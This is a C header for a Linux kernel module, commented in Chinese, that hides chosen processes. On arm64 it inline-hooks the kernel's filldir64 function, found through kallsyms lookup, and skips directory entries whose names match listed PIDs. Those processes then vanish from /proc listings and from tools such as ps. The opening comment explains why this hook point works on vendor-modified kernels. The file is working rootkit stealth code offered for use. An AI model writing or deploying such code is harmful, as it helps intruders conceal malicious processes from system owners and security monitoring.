
/*
// 隐藏逻辑思路大改
隐藏 /proc PID 目录的新方案：直接 hook getdents64 使用的 filldir64 actor。


1. 用户态 ls /proc 最终会走 getdents64。
2. getdents64 在内核里会创建 struct getdents_callback64，里面的 ctx.actor 指向 filldir64。
3. procfs 内部无论是 proc_fill_cache -> dir_emit，还是厂商改写后的 emit 路径，最终都要调用 ctx->actor。
4. 与其在 proc_root_readdir/proc_pid_readdir 入口临时替换 ctx->actor，不如直接 hook actor 本体 filldir64。

- 不依赖厂商 proc_pid_readdir 是否调用 proc_fill_cache。
- 不需要保存/替换 ctx->actor，避开并发枚举时 actor 槽位绑定错乱的风险。
- getdents64 目录项输出前统一经过 filldir64，命中隐藏 PID 时直接返回“当前项成功处理”。

限制：
- 只覆盖使用 filldir64 的 getdents64 路径；如果 32 位 compat 路径使用 compat_filldir，需要另 hook。
- filldir64 参数里没有 struct file，无法精确判断当前目录是否是 /proc。
  不过不影响：这里按 DT_DIR + 数字 PID 名字过滤，理论上其他目录下同名数字目录也会被隐藏。

*/
#ifndef HIDE_PROCESS_H
#define HIDE_PROCESS_H

#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/version.h>
#include <linux/mutex.h>

#include "export_fun.h"
#include "inline_hook_frame.h"

#define HIDE_PROCESS_MAX_PIDS 8

// 隐藏表保存内核侧 pid/tgid 数值；filldir64 里只拿得到目录项 name，所以后面转成字符串比较。
static pid_t g_hidden_pids[HIDE_PROCESS_MAX_PIDS];
static struct hook_entry g_filldir64_hook[1];
static DEFINE_MUTEX(g_hide_process_lock);

// hook 热路径的快速空表判断：没有隐藏 PID 时直接放行原 filldir64。
static bool hide_process_has_pid(void)
{
    int i;

    for (i = 0; i < HIDE_PROCESS_MAX_PIDS; i++)
        if (READ_ONCE(g_hidden_pids[i]))
            return true;
    return false;
}

// filldir64 没有 struct file 参数，无法确认当前目录是否为 /proc；这里用 DT_DIR + 精确 PID 名字匹配。
static bool hide_process_match_pid_name(const char *name, int namlen, unsigned int d_type)
{
    char pid_str[16];
    int i, pid_len;

    if (d_type != DT_DIR || !name || namlen <= 0 || namlen >= sizeof(pid_str))
        return false;

    for (i = 0; i < HIDE_PROCESS_MAX_PIDS; i++)
    {
        pid_t hidden_pid = READ_ONCE(g_hidden_pids[i]);

        if (!hidden_pid)
            continue;

        // name 不是 NUL 结尾字符串，必须按 namlen 做定长比较。
        pid_len = snprintf(pid_str, sizeof(pid_str), "%d", hidden_pid);
        if (pid_len == namlen && __builtin_memcmp(name, pid_str, namlen) == 0)
            return true;
    }
    return false;
}

// inline hook 工作函数，返回 0 表示继续执行原 filldir64，返回 1 表示跳过原 filldir64。
static int filldir64_hook_work(struct pt_regs *regs)
{
    // arm64 调用约定：filldir64(ctx, name, namlen, offset, ino, d_type)
    const char *name = (const char *)regs->regs[1];
    int namlen = (int)regs->regs[2];
    unsigned int d_type = (unsigned int)regs->regs[5];

    if (!hide_process_has_pid())
        return 0;

    if (!hide_process_match_pid_name(name, namlen, d_type))
        return 0;

    // 命中后伪造“filldir64返回值当前目录项已成功处理”，并跳过原 filldir64，不写入用户缓冲。
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
    regs->regs[0] = true; // filldir64返回值 6.1以上返回true表示成功处理
#else
    regs->regs[0] = 0; // filldir64返回值 6.1一下返回0表示没有错误成功处理
#endif
    return 1; // 不继续执行filldir64
}

// 安装 hook，隐藏目标 pid。
static int hide_process_install(pid_t pid)
{
    unsigned long filldir64_addr;
    int ret = 0;
    int i, empty = -1;

    if (pid <= 0)
        return -EINVAL;

    mutex_lock(&g_hide_process_lock);

    if (!g_filldir64_hook[0].target_addr)
    {
        // filldir64 是 getdents64 的 actor 本体；符号存在时比改 ctx->actor 更少碰 procfs 内部路径。
        filldir64_addr = generic_kallsyms_lookup_name("filldir64");
        if (!filldir64_addr)
        {
            ret = -ENOENT;
            goto out_unlock;
        }

        g_filldir64_hook[0] = (struct hook_entry){
            .target_sym = NULL,
            .target_addr = filldir64_addr,
            .work_fn = filldir64_hook_work,
            .trampoline = NULL,
            .saved_insn = {0},
            .installed = false,
            .slot_index = -1,
        };
    }

    ret = inline_hook_install(g_filldir64_hook);
    if (ret)
        goto out_unlock;

    // hook 安装成功后再写隐藏表，避免表里有 PID 但拦截点没生效。
    for (i = 0; i < HIDE_PROCESS_MAX_PIDS; i++)
    {
        pid_t hidden_pid = READ_ONCE(g_hidden_pids[i]);

        if (hidden_pid == pid)
            goto out_unlock;
        if (!hidden_pid && empty < 0)
            empty = i;
    }

    if (empty < 0)
    {
        ret = -ENOSPC;
        goto out_unlock;
    }

    WRITE_ONCE(g_hidden_pids[empty], pid);

out_unlock:
    mutex_unlock(&g_hide_process_lock);
    return ret;
}

// 删除一个隐藏 PID；如果隐藏表已经空了，就卸载 filldir64 hook。
static void hide_process_remove(pid_t pid)
{
    int i;

    if (pid <= 0)
        return;

    mutex_lock(&g_hide_process_lock);
    for (i = 0; i < HIDE_PROCESS_MAX_PIDS; i++)
    {
        if (READ_ONCE(g_hidden_pids[i]) == pid)
            WRITE_ONCE(g_hidden_pids[i], 0);
    }

    if (!hide_process_has_pid())
        inline_hook_remove(g_filldir64_hook);
    mutex_unlock(&g_hide_process_lock);
}

#endif /* HIDE_PROCESS_H */
